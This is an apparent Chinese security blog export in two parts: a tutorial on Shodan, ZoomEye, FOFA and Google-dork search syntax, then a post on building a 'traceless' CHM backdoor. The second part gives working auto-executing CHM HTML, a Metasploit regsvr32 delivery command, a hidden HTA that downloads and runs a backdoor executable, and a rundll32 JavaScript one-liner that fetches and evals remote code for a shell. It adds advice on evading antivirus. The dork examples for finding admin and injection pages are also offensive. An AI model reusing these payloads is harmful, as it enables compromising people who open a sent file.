<li>isp: 搜索指定的ISP供应商，例如，isp:”China Telecom”</li>
<li>product: 搜索指定的操作系统/软件/平台，例如，product:”Apache httpd”</li>
<li>version: 搜索指定的软件版本，例如，version:”1.6.2”</li>
<li>geo: 搜索指定的地理位置，参数为经纬度，例如，geo:”3.8639,117.2808”</li>
<li>before/after: 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如，before:”11-11-11”</li>
<li>net: 搜索指定的IP地址或子网，例如，net:”210.45.36.0/24”</li>
</ul>
<p><strong>举个栗子：</strong></p>
<p>查找位于郑州的Apache服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apache city:&quot;Zhengzhou&quot;</span><br></pre></td></tr></table></figure>
<p>查找位于国内的Nginx服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx country:&quot;CN&quot;</span><br></pre></td></tr></table></figure>
<p>查找指定网段的华为设备：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">huawei net:&quot;61.191.146.0&#x2F;24&quot;</span><br></pre></td></tr></table></figure>
<p><strong>Explore</strong><br>点击 Shodan 搜索栏右侧的 “Explore” 按钮，就会得到很多别人分享的搜索语法<br><img src="/posts/20144/4.png" alt></p>
<p>我们可以在别人搜索的基础上进行修改。</p>
<p><strong>其他</strong><br>Shodan 不仅可以查找网络设备，它还具有其他相当不错的功能。</p>
<p>Exploits： 每次查询完后，点击页面上的 “Exploits” 按钮，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：<a href="https://exploits.shodan.io/welcome" target="_blank" rel="noopener">https://exploits.shodan.io/welcome</a></p>
<p>地图： 每次查询完后，点击页面上的 “Maps” 按钮，Shodan 会将查询结果可视化的展示在地图当中</p>
<p>报表： 每次查询完后，点击页面上的 “Create Report” 按钮，Shodan 就会帮我们生成一份精美的报表。</p>
<h3 id="命令行下使用Shodon"><a href="#命令行下使用Shodon" class="headerlink" title="命令行下使用Shodon"></a>命令行下使用Shodon</h3><p>Shodan 是由官方提供的 Python 库的，项目位于：<a href="https://github.com/achillean/shodan-python" target="_blank" rel="noopener">https://github.com/achillean/shodan-python</a></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install shodan</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;achillean&#x2F;shodan-python.git &amp;&amp; cd shodan-python</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<p>安装完成之后我们看一下帮助信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ shodan -h</span><br><span class="line">Usage: shodan-script.py [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  alert       Manage the network alerts for your account</span><br><span class="line">  convert     Convert the given input data file into a different format.</span><br><span class="line">  count       Returns the number of results for a search</span><br><span class="line">  data        Bulk data access to Shodan</span><br><span class="line">  domain      View all available information for a domain</span><br><span class="line">  download    Download search results and save them in a compressed JSON...</span><br><span class="line">  honeyscore  Check whether the IP is a honeypot or not.</span><br><span class="line">  host        View all available information for an IP address</span><br><span class="line">  info        Shows general information about your account</span><br><span class="line">  init        Initialize the Shodan command-line</span><br><span class="line">  myip        Print your external IP address</span><br><span class="line">  org         Manage your organization&#39;s access to Shodan</span><br><span class="line">  parse       Extract information out of compressed JSON files.</span><br><span class="line">  radar       Real-Time Map of some results as Shodan finds them.</span><br><span class="line">  scan        Scan an IP&#x2F; netblock using Shodan.</span><br><span class="line">  search      Search the Shodan database</span><br><span class="line">  stats       Provide summary information about a search query</span><br><span class="line">  stream      Stream data in real-time.</span><br><span class="line">  version     Print version of this tool.</span><br></pre></td></tr></table></figure>
<h4 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h4><p><strong>init</strong><br>初始化命令行工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ shodan init [API_Key]  btrs7DoaGz00wK5Me1fpKITKLGvuGtQM</span><br><span class="line">Successfully initialized</span><br></pre></td></tr></table></figure>

<p><strong>count</strong><br>返回查询结果的数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ shodan count ...（待补）</span><br></pre></td></tr></table></figure>

<p><strong>download</strong><br>将搜索结果下载到一个文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载1000条结果，如果想下载更多结果需要增加 –limit 参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan download microsoft-data microsoft iis 6.0</span><br></pre></td></tr></table></figure>

<p><strong>parse</strong><br>我们可以使用 parse 来解析之前下载数据，它可以帮助我们过滤出自己感兴趣的内容，也可以用来将下载的数据格式从 JSON 转换成 CSV 等等其他格式，当然更可以用作传递给其他处理脚本的管道。例如，我们想将上面下载的数据以CSV格式输出IP地址、端口号和组织名称：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz</span><br></pre></td></tr></table></figure>

<p><strong>host</strong><br>查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan host [IP]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ shodan host 189.201.128.250</span><br><span class="line">189.201.128.250</span><br><span class="line">Hostnames:               ptr.reditmx.com</span><br><span class="line">City:                    Mexico City</span><br><span class="line">Country:                 Mexico</span><br><span class="line">Organization:            Metro Net, S.A.P.I. de C.V.</span><br><span class="line">Updated:                 2019-09-06T19:54:11.283180</span><br><span class="line">Number of open ports:    2</span><br><span class="line">Vulnerabilities:         Heartbleed</span><br><span class="line"></span><br><span class="line">Ports:</span><br><span class="line">    443&#x2F;tcp</span><br><span class="line">        |-- SSL Versions: -SSLv2, -TLSv1.3, SSLv3, TLSv1, TLSv1.1, TLSv1.2</span><br><span class="line">        |-- Diffie-Hellman Parameters:</span><br><span class="line">                Bits:          1024</span><br><span class="line">                Generator:     2</span><br><span class="line">                Fingerprint:   RFC2409&#x2F;Oakley Group 2</span><br><span class="line">   8009&#x2F;tcp FortiGate Endpoint Control httpd</span><br></pre></td></tr></table></figure>

<p><strong>search</strong><br>直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据。当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0</span><br></pre></td></tr></table></figure>

<h4 id="脚本调用shodan库"><a href="#脚本调用shodan库" class="headerlink" title="脚本调用shodan库"></a>脚本调用shodan库</h4><p>安装shodan库，在使用shodan库之前需要初始化链接API，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import shodan</span><br><span class="line"></span><br><span class="line">SHODAN_API_KEY &#x3D; &quot;API_Key&quot;</span><br><span class="line"></span><br><span class="line">api &#x3D; shodan.Shodan(SHODAN_API_KEY)</span><br></pre></td></tr></table></figure>
<p>随后我们就可以搜索数据了，示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">	results &#x3D; api.search(&#39;apache&#39;)</span><br><span class="line">	# 显示结果</span><br><span class="line">	print(&quot;Results found: %s&quot; % results[&#39;total&#39;])</span><br><span class="line">	for results in results[&#39;ip_str&#39;]:</span><br><span class="line">		print(results[&#39;ip_str&#39;])</span><br><span class="line">except shodan.APIError, e:</span><br><span class="line">	print(&quot;Error: %s&quot; % e)</span><br></pre></td></tr></table></figure>
<p>这里 Shodan.search() 会返回类似如下格式的 JSON 数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">         &#39;total&#39;: 8669969,</span><br><span class="line">         &#39;matches&#39;: [</span><br><span class="line">                 &#123;</span><br><span class="line">                         &#39;data&#39;: &#39;HTTP&#x2F;1.0 200 OK\r\nDate: Mon, 08 Nov 2010 05:09:59 GMT\r\nSer...&#39;,</span><br><span class="line">                         &#39;hostnames&#39;: [&#39;pl4t1n.de&#39;],</span><br><span class="line">                         &#39;ip&#39;: 3579573318,</span><br><span class="line">                         &#39;ip_str&#39;: &#39;89.110.147.239&#39;,</span><br><span class="line">                         &#39;os&#39;: &#39;FreeBSD 4.4&#39;,</span><br><span class="line">                         &#39;port&#39;: 80,</span><br><span class="line">                         &#39;timestamp&#39;: &#39;2014-01-15T05:49:56.283713&#39;</span><br><span class="line">                 &#125;,</span><br><span class="line">                 ...</span><br><span class="line">         ]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/20144/script.png" alt></p>
<p><strong>常用shodan库函数</strong></p>
<ul>
<li>shodan.Shodan(key) ：初始化连接API</li>
<li>Shodan.count(query, facets=None)：返回查询结果数量</li>
<li>Shodan.host(ip, history=False)：返回一个IP的详细信息</li>
<li>Shodan.ports()：返回Shodan可查询的端口号</li>
<li>Shodan.protocols()：返回Shodan可查询的协议</li>
<li>Shodan.services()：返回Shodan可查询的服务</li>
<li>Shodan.queries(page=1, sort=’timestamp’, order=’desc’)：查询其他用户分享的查询规则</li>
<li>Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</li>
<li>Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</li>
</ul>
<h2 id="0x01-ZoomEye"><a href="#0x01-ZoomEye" class="headerlink" title="0x01 ZoomEye"></a>0x01 ZoomEye</h2><p>Zoomeye众所周知国内比较比较好的网络空间搜索引擎，相比shodan更侧重于web层面，指纹识别、web容器一类的zoomeye当之无愧。<br><a href="https://www.zoomeye.org" target="_blank" rel="noopener">钟馗之眼</a><br><img src="/posts/20144/2.png" alt></p>
<h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><ol>
<li><p>搜索指定组件及版本</p>
<p>app: 组件版本<br>ver: 组件版本<br>例如，搜索Apache组件版本2.4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app:apache ver:2.4</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定端口</p>
<p>port： 端口号</p>
<p>例如，搜索开发了ssh端口的主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port:22</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定操作系统</p>
<p>OS: 操作系统</p>
<p>例如，搜索Linux操作系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OS:Linux</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定服务</p>
<p>service: 服务名称</p>
<p>例如，搜索ssh服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service:ssh</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定地理位置</p>
<p>country: 国家<br>city: 城市</p>
<p>例如，搜索中国，郑州</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">country: China city:Zhengzhou</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定CIDR网段</p>
<p>CIDR: 网段</p>
<p>例如，搜索192.168.220.0/24</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CTDR:192.168.220.0&#x2F;24</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定网站域名</p>
<p>site: 网站域名</p>
<p>例如，搜索百度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定主机名</p>
<p>hostname:jw.zut.edu.cn</p>
<p>例如，搜索jw.zut.edu.cn</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hostname:jw.zut.edu.cn</span><br></pre></td></tr></table></figure></li>
<li><p>搜索指定设备名</p>
<p>device:设备名</p>
<p>例如，搜索路由器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">device:router</span><br></pre></td></tr></table></figure></li>
<li><p>搜索具有特定首页关键词的主机</p>
<p>keyword:关键词</p>
<p>例如，搜索关键词security</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyword:security</span><br></pre></td></tr></table></figure>
<h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3></li>
</ol>
<p>搜索位于美国、主机系统为Linux、开启SSH服务的目标主机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">country:US OS:Linux service:ssh</span><br></pre></td></tr></table></figure>

<h2 id="0x02-FOFA"><a href="#0x02-FOFA" class="headerlink" title="0x02 FOFA"></a>0x02 FOFA</h2><p>国内漏洞查询和资产收集比较好的一款搜索引擎，与其他搜索引擎都大同小异，功能差别不是太大。<br><img src="/posts/20144/3.png" alt></p>
<h3 id="常用语法-1"><a href="#常用语法-1" class="headerlink" title="常用语法"></a>常用语法</h3><p>直接输入查询语句，将从标题、html内容、http头信息、url字段中搜索。</p>
<ul>
<li>title=”abc”   从标题中搜索abc</li>
<li>header=”abc”  从http头中搜索abc</li>
<li>body=”abc”    从html正文中搜索abc</li>
<li>domain=”abc.com”   搜索根域名带有abc.com的网站</li>
<li>host=”.edu.cn”    从url中搜索.edu.cn，注意搜索要用host作为名称</li>
<li>port=”443”     查找对应端口443的资产</li>
<li>ip=”1.1.1.1”    从ip中搜索包含1.1.1.1的网站，注意搜索要用ip作为名称   </li>
<li>country=”CN”    搜索指定国家(编码)的资产 </li>
</ul>
<p>注意： <code>==</code> 符号是完全匹配，加快搜索时间 <code>&amp;&amp;</code> 之类的逻辑符都可以用，搜索语法类似Google！</p>
<p>更多详细内容查看: <a href="https://fofa.so/help" target="_blank" rel="noopener">FOFA帮助文档</a></p>
<h3 id="举个栗子-1"><a href="#举个栗子-1" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>目录遍历</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;index of&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/20144/11.png" alt></p>
<h2 id="0x03-Google-Hacking"><a href="#0x03-Google-Hacking" class="headerlink" title="0x03 Google Hacking"></a>0x03 Google Hacking</h2><h3 id="常用语法-2"><a href="#常用语法-2" class="headerlink" title="常用语法"></a>常用语法</h3><ul>
<li>intext: 把网页中的正文内容中的某个字符作为搜索的条件</li>
<li>intitle: 把网页标题中的某个字符作为搜索的条件</li>
<li>cache: 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息</li>
<li>filetype: 指定一个格式类型的文件作为搜索对象</li>
<li>inurl: 搜索包含指定字符的url</li>
<li>site: 在指定的站点搜索相关内容</li>
<li>引号 “” : 把关键字打上引号后把引号部分作为整体来搜索</li>
<li>or： 同时搜索两个或更多的关键字</li>
<li>link： 搜索某个网站的链接</li>
</ul>
<h3 id="典型用法"><a href="#典型用法" class="headerlink" title="典型用法"></a>典型用法</h3><ol>
<li><p>找后台地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.com intext:管理|后台|登录|用户名|密码|系统|账号</span><br><span class="line">site:xxx.com inurl:login&#x2F;admin&#x2F;manage&#x2F;manager&#x2F;admin_login&#x2F;system</span><br><span class="line">site:xxx.com intitle:管理|后台|登录</span><br></pre></td></tr></table></figure></li>
<li><p>找上传类漏洞地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.com inurl:file</span><br><span class="line">site:xxx.com inurl:upload</span><br></pre></td></tr></table></figure></li>
<li><p>找注入页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.com inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure></li>
<li><p>找编辑器页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.com inurl:ewebeditor</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>构造无痕CHM后门</title>
    <url>/posts/13577.html</url>
    <content><![CDATA[<h2 id="0x00-chm-是什么"><a href="#0x00-chm-是什么" class="headerlink" title="0x00 chm 是什么"></a>0x00 chm 是什么</h2><p>CHM [Compiled Help Manual],即”已编译的帮助文件”,它是微软新一代帮助文件格式,利用HTML作源文,把帮助内容以类似数据库的形式进行编译储存,以.CHM后缀结尾,支持Javascript,VBscript,ActiveX,Java Applet,Flash,以及常见图形文件(GIF,JPEG,PNG),音频视频文件(MID,WAV,AVI)等…,也就是说,我们可以直接利用chm去肆意地访问各类网络资源,另外,因其使用方便,形式多样,通常也多被采用作为电子书的默认格式。</p>
<h2 id="0x01-chm-制作"><a href="#0x01-chm-制作" class="headerlink" title="0x01 chm 制作"></a>0x01 chm 制作</h2><p>新建一个文件夹，里面有一个test.html，内容随意<br><img src="/posts/13577/1.png" alt></p>
<p>打开EasyCHM，新建-&gt;浏览。选择该目录。默认文件类型<br><img src="/posts/13577/2.png" alt></p>
<p>点击确认，即可看到预览的CHM文件<br><img src="/posts/13577/3.png" alt></p>
<p>选择文件—编译，即可编译成CHM文件。</p>
<p><strong>举个例子</strong></p>
<p>弹出计算器</p>
<p>test.html 的内容为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;Content-Type&quot; Content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;test&lt;&#x2F;TITLE&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR&#x3D;&quot;#FFFFFF&quot; TEXT&#x3D;&quot;#000000&quot;&gt;</span><br><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,calc.exe,&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Just a test!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;BODY&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;OBJECT&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 为核心代码，只需将这段代码插入任意html中即可。</p>
<p>按照上述过程制作test.chm文件<br>双击生成的.chm文件<br><img src="/posts/13577/4.png" alt></p>
<h2 id="0x02-借助chm实现meterpreter上线"><a href="#0x02-借助chm实现meterpreter上线" class="headerlink" title="0x02 借助chm实现meterpreter上线"></a>0x02 借助chm实现meterpreter上线</h2><p>既然现在都能弹计算器了,很明显,弹个meterpreter又会有多难呢,首先,先把msf起起来准备好相应的payload,如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set target 3</span><br><span class="line">target &#x3D;&gt; 3</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set lhost 192.168.72.23</span><br><span class="line">lhost &#x3D;&gt; 192.168.72.23</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set lport 5555</span><br><span class="line">lport &#x3D;&gt; 5555</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set exitonsession false</span><br><span class="line">exitonsession &#x3D;&gt; false</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.72.23:5555 </span><br><span class="line">[*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;CSw0SdX2n23YH</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.72.23:8080&#x2F;CSw0SdX2n23YH</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.72.23:8080&#x2F;CSw0SdX2n23YH.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<p>接着,只需要把弹计算器部分的命令替换成上面远程加载执行payload的命令即可,而后再重新编译为chm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,regsvr32,&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.14:8080&#x2F;WzRAPJ4u2Pp2IAL.sct scrobj.dll&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>

<p>不过，在目标执行chm文件之后，却出现如下错误，目前尚未解决<br><img src="/posts/13577/7.png" alt></p>
<h2 id="0x03-利用chm实现自定义木马上线"><a href="#0x03-利用chm实现自定义木马上线" class="headerlink" title="0x03 利用chm实现自定义木马上线"></a>0x03 利用chm实现自定义木马上线</h2><p><strong>注意:</strong> 最好不要再直接用powershell或者cmd去远程执行下载,不然在打开chm时会飘黑框</p>
<p>为了能让chm在打开时不弹黑框,此处我们就用一种比较间接的方式,用hta来帮我们在前面挡一刀,即 用先在chm里执行hta,而hta里放的则是远程加载执行我们自己马的powershell代码,具体如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;init.d&#x2F;apache2 start</span><br><span class="line"># mv &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;chmbackdoor.exe &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"># mv &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;downloader.sct &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"># netstat -tulnp</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cat loader.hta		可以清晰的看到,此hta中放的才是真正的ps下载者</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">	&lt;HEAD&gt;</span><br><span class="line">	&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">	&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">	Sub window_onload</span><br><span class="line">		window.resizeTo 0,0</span><br><span class="line">		window.MoveTo -100,-100</span><br><span class="line">		const impersonation &#x3D; 3</span><br><span class="line">		Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">		Set Locator &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">		Locator.Run&quot;PowerShell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.3.14&#x2F;chmbackdoor.exe&#39;,&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);&quot;,0,FALSE</span><br><span class="line">		window.close()</span><br><span class="line">	end sub</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">	&lt;&#x2F;HEAD&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
<p>而在chm文件中则是执行上面hta,但执行hta本身却是没有黑框的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,mshta,http:&#x2F;&#x2F;192.168.3.14&#x2F;loader.hta&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>当目标正常双击打开我们发给他的chm文件时,稍等片刻[ps下载稍微需要点儿时间],另外,因为是下载自己的马,所以免杀和马的体积[越小越好]要务必处理好<br><img src="/posts/13577/11.png" alt></p>
<h2 id="0x04-利用js来无痕触发chm后门"><a href="#0x04-利用js来无痕触发chm后门" class="headerlink" title="0x04 利用js来无痕触发chm后门"></a>0x04 利用js来无痕触发chm后门</h2><p><strong>第一种方式</strong><br>直接powershell脚本来免杀弹回一个半交互的shell，这种方式通常比较适合针对单个单点拿shell,可能需要人一直守着,一旦看到上了以后,就需要里面进行下一步的动作,脚本的具体使用,如下,先修改监听ip,为本机ip[实战中肯定是用vps的公网ip来搞]</p>
<p><a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener" title="JSRat.ps1">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$Server &#x3D; &#39;192.168.72.23&#39; #Listening IP. Change This.</span><br></pre></td></tr></table></figure>
<p>而后加载执行脚本开始监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File JSRat.ps1</span><br></pre></td></tr></table></figure>
<p><img src="/posts/13577/9.png" alt><br>接下来的事情就是把下面的利用代码替换到我们事先准备好的chm中,具体如下,记得里面的ip要改成上面监听的ip,另外,务必要注意value=中的单双引号问题,否则语法错误会造成payload无法被正常执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;);try&#123;v&#x3D;w.RegRead(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer&quot;);q&#x3D;v.split(&quot;&#x3D;&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.11&#x2F;connect&quot;,false);try&#123;h.Send();B&#x3D;h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure>
<p>之后,再重新编译chm,丢到目标机器上打开,即可看到一个cmd shell被正常弹回,只不过,这里稍微有点瑕疵,当第一次打开chm的一瞬间,会有所卡顿[其实这个过程就是在执行payload,也可能是rudll32的问题,regsvr32就不会],而之后再打开,就没有多大感觉了</p>
<p>Shell回来以后,为了巩固权限,可立即远程加载执行自己的马,毕竟,一个cmd shell肯定活不了多长时间<br><img src="/posts/13577/10.png" alt></p>
<p><strong>第二种方式</strong></p>
